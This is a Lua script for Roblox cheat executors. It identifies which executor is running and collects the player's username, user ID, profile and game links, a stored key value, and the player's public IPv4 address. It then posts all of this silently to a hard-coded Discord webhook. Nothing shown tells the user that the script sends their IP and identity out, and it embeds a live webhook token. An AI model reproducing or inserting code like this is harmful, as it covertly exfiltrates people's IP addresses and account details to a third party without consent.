getgenv().GameName2 = getgenv().GameName1

local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    "(Provalmente Electron)"

    local url = "https://discordapp.com/api/webhooks/820833968210313247/nayy43r6qTWcVsb-niEld9pgLZaWukR_Rqsl2ywlrBvX7trXrUcKhFUMHrpk9_OM4DJX"
    local data = {
    ["embeds"] = {
        {
            ["title"] = "***Script Executed...***",
            ["description"] = "**Checking...**",
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
            ["image"] = {
                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                    tostring(game:GetService("Players").LocalPlayer.Name)
            },
            ["thumbnail"] = {
                ["url"] = "https://cdn.discordapp.com/attachments/820859995528626196/820860078604681216/loading-icon-transparent-background-12.gif"
                },
                ["fields"] = {
                    {
                        ["name"] = "**Nick:** " .. game.Players.LocalPlayer.Name.."",
                        ["value"] = "https://www.roblox.com/users/" .. tostring(game:GetService("Players").LocalPlayer.UserId) .. "/profile",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**Perfil Link:**",
                        ["value"] = "https://www.roblox.com/users/" .. tostring(game:GetService("Players").LocalPlayer.UserId) .. "/profile",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**Exploit:**",
                        ["value"] = webhookcheck,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**Game:**",
                        ["value"] = "https://www.roblox.com/games/" .. tostring(game.PlaceId) .. "/",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**IP/IPv4:**",
                        ["value"] = game:HttpGet("https://v4.ident.me/"),
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**IPv6:**",
                        ["value"] = "Null(VPN Risc)",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**Key:**",
                        ["value"] = getgenv().KeyPass,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**Game:**",
                        ["value"] = getgenv().GameName2,
                        ["inline"] = false
                    }
                }
        }
    }
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)

    local headers = {
    ["content-type"] = "application/json"
    }
    request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
